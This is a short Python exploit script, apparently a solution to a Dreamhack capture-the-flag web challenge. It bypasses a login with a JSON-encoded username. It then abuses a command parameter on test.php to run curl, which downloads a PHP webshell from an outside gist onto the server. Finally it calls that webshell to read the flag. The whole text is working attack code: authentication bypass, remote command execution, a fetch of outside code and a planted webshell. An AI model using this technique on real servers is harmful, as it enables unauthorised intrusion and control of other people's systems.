import requests
import time
import json
import re

URL = "http://host3.dreamhack.games:16614"

webshell = 'https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php'
download_webshell = f'curl {webshell} -o webshell.php'


sess = requests.Session()
sess.post(URL+'/index.php', data={'username': json.dumps({'username': True})})
sess.get(URL+'/test.php', params={'cmd': download_webshell})

time.sleep(5)

resp = requests.get(URL+'/webshell.php', params={'cmd': '/flag'})

match = re.search(r'DH\{[^}]*\}', resp.text)
print(match.group(0))
